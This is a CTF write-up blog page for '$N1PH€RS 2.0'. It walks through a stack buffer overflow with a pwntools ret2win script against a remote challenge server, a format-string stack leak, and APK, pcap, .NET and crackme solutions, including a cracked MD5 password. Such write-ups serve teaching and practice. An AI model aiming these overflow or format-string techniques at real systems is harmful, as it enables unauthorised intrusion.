<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>$N1PH€RS 2.0 CTF :: quixel200</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="$N1PH€RS 2.0 CTF Writeup Challenge 2 - Binary Exploitation We have a win function in the binary, however it&rsquo;s never called. Let&rsquo;s look at the security of the binary:
quixel@pop-os:~/Desktop/sniphers$ checksec --file chall2 [*] &#39;/home/quixel/Desktop/sniphers/chall2&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No We can see that it does not contain any stack canary, nor does it have PIE which means the address of functions and variables are always the same. Let&rsquo;s try a buffer overflow.
" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://quixel200.github.io/writeups/sniphers/" />





  
  <link rel="stylesheet" href="https://quixel200.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/terminal.min.b9fcf12f2827d468ddb6580a4de4fb1f7e8ce515cea5b1d07444aecd8e1b6bbe.css">

  
  <link rel="stylesheet" href="https://quixel200.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="https://quixel200.github.io/favicon.png">
<link rel="apple-touch-icon" href="https://quixel200.github.io/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="website" />
<meta property="og:title" content="$N1PH€RS 2.0 CTF">
<meta property="og:description" content="$N1PH€RS 2.0 CTF Writeup Challenge 2 - Binary Exploitation We have a win function in the binary, however it&rsquo;s never called. Let&rsquo;s look at the security of the binary:
quixel@pop-os:~/Desktop/sniphers$ checksec --file chall2 [*] &#39;/home/quixel/Desktop/sniphers/chall2&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No We can see that it does not contain any stack canary, nor does it have PIE which means the address of functions and variables are always the same. Let&rsquo;s try a buffer overflow.
" />
<meta property="og:url" content="https://quixel200.github.io/writeups/sniphers/" />
<meta property="og:site_name" content="quixel200" />

  <meta property="og:image" content="https://quixel200.github.io/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2025-08-18 15:18:59 &#43;0530 IST" />




  <link href="/writeups/sniphers/index.xml" rel="alternate" type="application/rss+xml" title="quixel200" />









</head>
<body>


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Terminal
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/articles">Articles</a></li>
        
      
        
          <li><a href="/notes">Notes</a></li>
        
      
        
          <li><a href="/projects">Projects</a></li>
        
      
        
          <li><a href="/writeups">Writeups</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/articles" >Articles</a></li>
        
      
        
          <li><a href="/notes" >Notes</a></li>
        
      
        
          <li><a href="/projects" >Projects</a></li>
        
      
        
          <li><a href="/writeups" >Writeups</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
  
    <div class="index-content">
      <h1 id="n1phrs-20-ctf-writeup">$N1PH€RS 2.0 CTF Writeup</h1>
<h2 id="challenge-2---binary-exploitation">Challenge 2 - Binary Exploitation</h2>
<p><img src="/writeups/sniphers/images/win.png" alt="Win Function"></p>
<p>We have a win function in the binary, however it&rsquo;s never called. Let&rsquo;s look at the security of the binary:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">quixel@pop-os:~/Desktop/sniphers$ checksec --file chall2
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/quixel/Desktop/sniphers/chall2&#39;</span>
</span></span><span class="line"><span class="cl">Arch:       amd64-64-little
</span></span><span class="line"><span class="cl">RELRO:      Partial RELRO
</span></span><span class="line"><span class="cl">Stack:      No canary found
</span></span><span class="line"><span class="cl">NX:         NX enabled
</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</span></span><span class="line"><span class="cl">SHSTK:      Enabled
</span></span><span class="line"><span class="cl">IBT:        Enabled
</span></span><span class="line"><span class="cl">Stripped:   No
</span></span></code></pre></div><p>We can see that it does not contain any stack canary, nor does it have PIE which means the address of functions and variables are always the same. Let&rsquo;s try a buffer overflow.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">quixel@pop-os:~/Desktop/sniphers$ ./chall2 
</span></span><span class="line"><span class="cl">Deep within the depths of binary land, a careless developer has left behind a <span class="k">function</span> that grants instant victory. However, there<span class="s1">&#39;s a catch – it&#39;</span>s never called!
</span></span><span class="line"><span class="cl">There<span class="s1">&#39;s no easy way in, and you&#39;</span>ll need to craft the perfect input
</span></span><span class="line"><span class="cl">Enter your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
</span></span><span class="line"><span class="cl">Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span></span></code></pre></div><p>We get a segmentation fault which means the program crashed. So it is vulnerable to overflow, a more elegant way to verify would have been to use Ghidra but hey it works. Let&rsquo;s look at the binary more closely with gdb:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; info functions
</span></span><span class="line"><span class="cl">All defined functions:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Non-debugging symbols:
</span></span><span class="line"><span class="cl">0x0000000000401000  _init
</span></span><span class="line"><span class="cl">0x00000000004010b0  _start
</span></span><span class="line"><span class="cl">0x00000000004010e0  _dl_relocate_static_pie
</span></span><span class="line"><span class="cl">0x00000000004010f0  deregister_tm_clones
</span></span><span class="line"><span class="cl">0x0000000000401120  register_tm_clones
</span></span><span class="line"><span class="cl">0x0000000000401160  __do_global_dtors_aux
</span></span><span class="line"><span class="cl">0x0000000000401190  frame_dummy
</span></span><span class="line"><span class="cl">0x0000000000401196  win
</span></span><span class="line"><span class="cl">0x00000000004011b0  main
</span></span><span class="line"><span class="cl">0x0000000000401230  _fini
</span></span><span class="line"><span class="cl">pwndbg&gt; disass win
</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> win:
</span></span><span class="line"><span class="cl">0x0000000000401196 &lt;+0&gt;:	endbr64 
</span></span><span class="line"><span class="cl">0x000000000040119a &lt;+4&gt;:	push   rbp
</span></span><span class="line"><span class="cl">0x000000000040119b &lt;+5&gt;:	mov    rbp,rsp
</span></span><span class="line"><span class="cl">0x000000000040119e &lt;+8&gt;:	lea    rax,<span class="o">[</span>rip+0xe63<span class="o">]</span>        <span class="c1"># 0x402008</span>
</span></span><span class="line"><span class="cl">0x00000000004011a5 &lt;+15&gt;:	mov    rdi,rax
</span></span><span class="line"><span class="cl">0x00000000004011a8 &lt;+18&gt;:	call   0x401080
</span></span><span class="line"><span class="cl">0x00000000004011ad &lt;+23&gt;:	nop
</span></span><span class="line"><span class="cl">0x00000000004011ae &lt;+24&gt;:	pop    rbp
</span></span><span class="line"><span class="cl">0x00000000004011af &lt;+25&gt;:	ret    
</span></span><span class="line"><span class="cl">End of assembler dump.
</span></span></code></pre></div><p>We can see that the win is located at <code>0x0000000000401196</code>, and since PIE is disabled, we can be certain that win is always present at that address. Now we need to find the offset needed to correctly place this address at RIP so that the program jumps to the win function.</p>
<p>You can use cyclic to find it, I found that it&rsquo;s at 88. So our payload is 88 characters + address of win.</p>
<p>However this is a 64 bit binary and it checks for stack alignment, one way to overcome this is to use a ret instruction to align it, or we can jump one or two instructions right after the function starts. I went with the second approach, here&rsquo;s my pwntools script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;chall2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#p = elf.process()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;209.38.121.6&#34;</span><span class="p">,</span><span class="mi">5007</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">88</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040119b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter your input: &#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><h2 id="love---android-apk-analysis">Love - Android APK Analysis</h2>
<h3 id="do-you-love-flames">Do you love flames</h3>
<p><img src="/writeups/sniphers/images/love.png" alt="Love Challenge"></p>
<p>We are given an APK file. Generally APK files are mostly compiled in Java which makes them easy to reverse, I&rsquo;ll be using the <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF framework</a> to analyze the APK. We can run it in a Docker container. I&rsquo;ll also be using Genymotion to run an Android emulator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo docker run -it --rm -p 8000:8000 -p 1337:1337  <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-e <span class="nv">MOBSF_ANALYZER_IDENTIFIER</span><span class="o">=</span>127.0.0.1:6555 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>opensecurity/mobile-security-framework-mobsf:latest
</span></span></code></pre></div><p>The <code>-e</code> sets the environment so that MobSF can connect to our Android device for dynamic analysis.</p>
<p>To load the APK in our emulator we can use adb:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">quixel@pop-os:~$ adb install ~/Downloads/love.apk
</span></span></code></pre></div><p>Here&rsquo;s the main file we are interested in:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.tamilctf.love</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.os.Bundle</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.util.Log</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.view.View</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.widget.Button</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.widget.EditText</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.widget.TextView</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// ... (imports omitted for brevity)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MainActivity</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AppCompatActivity</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Button</span><span class="w"> </span><span class="n">magic</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">EditText</span><span class="w"> </span><span class="n">partnerName</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">TextView</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">EditText</span><span class="w"> </span><span class="n">yourName</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">FlagfromJNI</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">loadLibrary</span><span class="p">(</span><span class="s">&#34;love&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ... (onCreate method and other code)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">doFlame</span><span class="p">(</span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">charYname</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">charPname</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ... (flame algorithm implementation)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">flames</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;a&#39;</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">i</span><span class="p">(</span><span class="s">&#34;affectionate&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Just a Infatuation bruhhhh&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">q</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; has more AFFECTION on &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">w</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">101</span><span class="p">:</span><span class="w"> </span><span class="c1">// &#39;e&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">i</span><span class="p">(</span><span class="s">&#34;Enemy&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;You are enemy bruhh&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">q</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; is ENEMY to &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">w</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">102</span><span class="p">:</span><span class="w"> </span><span class="c1">// &#39;f&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">i</span><span class="p">(</span><span class="s">&#34;Friends&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;You are friends bruhh&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">q</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; is FRIEND to &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">w</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">108</span><span class="p">:</span><span class="w"> </span><span class="c1">// &#39;l&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">i</span><span class="p">(</span><span class="s">&#34;Love&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;You are couple&#39;s bruhh&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">q</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; is in LOVE with &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">w</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">109</span><span class="p">:</span><span class="w"> </span><span class="c1">// &#39;m&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">i</span><span class="p">(</span><span class="s">&#34;Flag :&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">FlagfromJNI</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">q</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; is going to MARRY &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">w</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">default</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">i</span><span class="p">(</span><span class="s">&#34;No words&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;crying only coming&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">q</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; and &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">w</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; are SISTERS/BROTHERS &#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Here&rsquo;s the interesting part I noticed:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">109</span><span class="p">:</span><span class="w"> </span><span class="c1">// &#39;m&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Log</span><span class="p">.</span><span class="na">i</span><span class="p">(</span><span class="s">&#34;Flag :&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">FlagfromJNI</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">q</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; is going to MARRY &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">w</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p>So if we get &ldquo;is going to MARRY&rdquo; then the flag is logged to the console with a call to <code>FlagfromJNI()</code>.</p>
<p>We both tested with random inputs to see if we got the message and eventually &ldquo;TEST&rdquo; and &ldquo;sfsf&rdquo; worked.</p>
<p>To view the logs, we can use the <code>adb logcat</code> command, which gives us the flag.</p>
<p><img src="/writeups/sniphers/images/love_flag.png" alt="Love Flag"></p>
<h2 id="mission-impossible---network-analysis">Mission Impossible - Network Analysis</h2>
<p><img src="/writeups/sniphers/images/mission_impossible.png" alt="Mission Impossible"></p>
<p>We are given a .pcapng file which is a network capture. We can view the file with Wireshark.</p>
<p>I noticed that there is only one TCP stream, so let&rsquo;s see what&rsquo;s in there.</p>
<p><img src="/writeups/sniphers/images/wireshark_capture.png" alt="Wireshark Capture"></p>
<p>Here&rsquo;s the entire conversation that was recorded:</p>
<pre tabindex="0"><code>Hi Charlie

Confirm ID?

From Alpha-Base-85 m0n1x90

ID Confirmed

Bravo! I think we are compromised...

Understood, lets break into streams

Got it!

Whats the status?

Hackers infiltrated. But we got the package!

Great Charlie!
Sarge says TangoDownTangoDown@123 to Captain

Gotcha!!

[an image is sent here]

Got your package to Alpha-Base-85

Okay Charlie

Will send our package later after verifying it..

Hmmm...Seems doubtful

Trust your comrades

Sure... Here is your cryptic info : 8T&amp;W+Ec*[T?SQV/6nih&amp;?V+U&amp;78QE=&lt;$;

Haah..Thanks

Soldiers don&#39;t say thanks
Base got Mayday.. Everything went south

Captain is waiting for the package. Send it soon

[repeats the conversation again]
</code></pre><p>We can extract the image from the stream and try steghide with the &ldquo;cryptic info&rdquo; as the password:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">steghide extract -sf image.jpg
</span></span></code></pre></div><p>Then we have a password protected zip file. In the message I see a very suspicious password-like string &ldquo;TangoDownTangoDown@123&rdquo;, which turns out to be the password, and we get the flag.</p>
<h2 id="crack-the-heart---net-reverse-engineering">Crack the Heart - .NET Reverse Engineering</h2>
<p><img src="/writeups/sniphers/images/crack_the_heart.png" alt="Crack the Heart"></p>
<p>The important detail to note is that this is a .NET executable. We can verify this through the json config file, or in Ghidra the function name in the dll is <code>_CorExeMain()</code> which is a dead giveaway.</p>
<p>The thing about .NET binaries is that they are compiled to a common codebase, similar to Java bytecode which means that reversing the binary is very easy and the decompiled output is very similar to the source code. For this we will use DnSpy or IlSpy.</p>
<p><img src="/writeups/sniphers/images/dnspy.jpeg" alt="DnSpy Analysis"></p>
<p>We can see a <code>verifyPassword()</code> function that seems to check the password and give us the flag if it&rsquo;s right. Here&rsquo;s the code for <code>verifyPassword()</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kd">static</span> <span class="kt">bool</span> <span class="n">VerifyPassword</span><span class="p">(</span><span class="kt">string</span> <span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">using</span> <span class="p">(</span><span class="n">MD5</span> <span class="n">md</span> <span class="p">=</span> <span class="n">MD5</span><span class="p">.</span><span class="n">Create</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="k">value</span> <span class="p">=</span> <span class="n">md</span><span class="p">.</span><span class="n">ComputeHash</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="n">a</span> <span class="p">=</span> <span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="k">value</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">).</span><span class="n">ToLower</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="p">=</span> <span class="p">(</span><span class="n">a</span> <span class="p">==</span> <span class="n">Program</span><span class="p">.</span><span class="n">storedHash</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The code basically checks if the MD5 hash of your input matches the hardcoded one which is <code>f25a2fc72690b780b2a14e140ef6a9e0</code>.</p>
<p>Google the hash and you can crack it, it says &ldquo;iloveyou&rdquo;, entering that gives us the flag:</p>
<pre tabindex="0"><code>C:\Users\blaze\Downloads&gt;&#34;Hash the Heart.exe&#34;
? iloveyou
TCTFxSTJ{C_H@sH_R3ver51ng_15_Fun} .... &lt;3
</code></pre><h2 id="stack-master---format-string-vulnerability">Stack Master - Format String Vulnerability</h2>
<p>This binary contains a format string vulnerability where user input is passed directly to <code>printf()</code> without proper formatting. This allows for us, the user, to print data from the stack, which is where the flag is stored. You can verify the vulnerability by passing something like %s, %d etc, or look at the decompiled output in Ghidra:</p>
<pre tabindex="0"><code>Sometimes, a program just trusts whatever you say :), repeating your words without question. 
But what if words could do more than just appear on the screen?
%p %p %p %p %p %p %p %p %p %p %p
0x7ffcba91b720 0x3f 0x732c43f147e2 0x9d 0x732c441e0040 0x6b61667b454b4146 0x7d67616c665f65 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025
</code></pre><p>This contains the fake flag, decode it from hex and swap endianness to get the flag.</p>
<h2 id="baby---crackme-challenge">Baby - Crackme Challenge</h2>
<p><img src="/writeups/sniphers/images/baby.png" alt="Baby Challenge"></p>
<p>This is a classic crackme challenge where we are given a binary. We can decompile it using Ghidra. The program logic is pretty simple as it checks each character of your input using an if condition, rearranging the variables properly gives us the flag.</p>
<p><img src="/writeups/sniphers/images/ghidra.png" alt="Ghidra Analysis"></p>
<h2 id="rettiwt---osint-challenge">Rettiwt - OSINT Challenge</h2>
<p><img src="/writeups/sniphers/images/rettwit.png" alt="Rettiwt Challenge"></p>
